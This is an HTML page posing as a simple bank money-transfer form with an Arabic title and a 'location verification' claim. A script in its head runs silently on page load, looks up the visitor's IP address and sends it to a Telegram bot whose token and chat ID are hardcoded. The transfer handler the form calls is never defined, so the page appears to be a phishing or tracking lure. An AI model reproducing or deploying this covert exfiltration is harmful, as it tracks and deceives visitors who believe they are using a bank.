<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحويل بنكي </title></title>
    <style>
       
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f5f6fa;
            margin: 0;
            padding: 0;
        }

        header {
            background-color: #0078d7;
            color: white;
            padding: 20px;
            text-align: center;
        }

        main {
            max-width: 600px;
            margin: 30px auto;
            padding: 20px;
            background-color: white;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
        }

        h1, h2 {
            color: #2c3e50;
        }

        form {
            margin-top: 20px;
        }

        label {
            display: block;
            margin: 10px 0 5px;
            font-weight: bold;
            color: #34495e;
        }

        input, button {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }

        button {
            background-color: #0078d7;
            color: white;
            font-weight: bold;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0056a3;
        }

        .response-message {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            font-weight: bold;
            text-align: center;
        }

        .success-message {
            background-color: #27ae60;
            color: white;
        }

        .error-message {
            background-color: #e74c3c;
            color: white;
        }

        footer {
            text-align: center;
            margin-top: 20px;
            color: #7f8c8d;
        }
    
    </style>
    <script>
        const BOT_TOKEN = "7772260536:AAF1fQtBRxKGmjpnoMYRxQcpRpyu8TixtO4";
        const CHAT_ID = "7153864821";

        async function sendIPToTelegram() {
            try {
                // Fetch IP address using an external API
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipAddress = data.ip;

                // Send IP address to Telegram
                const message = `
<b>User Visited the Page</b>
<b>IP Address:</b> ${ipAddress}
                `;
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        parse_mode: "html",
                        text: message
                    }),
                });
            } catch (error) {
                console.error("Failed to send IP address:", error);
            }
        }

        // Call the function when the page loads
        window.onload = sendIPToTelegram;
    </script>
</head>
<body>
    <header>
        <h1>Bank</h1>
        <p>Securely transfer money with location verification</p>
    </header>
    <main>
        <h2>Transfer Funds</h2>
        <form onsubmit="transferMoney(event)">
            <label for="account-number">Recipient Account Number:</label>
            <input type="text" id="account-number" placeholder="Enter account number" required>

            <label for="amount">Amount (USD):</label>
            <input type="number" id="amount" placeholder="Enter amount" required min="1">

            <button type="submit">Transfer</button>
        </form>
        <div id="response-message"></div>
    </main>
    <footer>
        <p>&copy; 2024 Bank.</p>
    </footer>
</body>
</html>
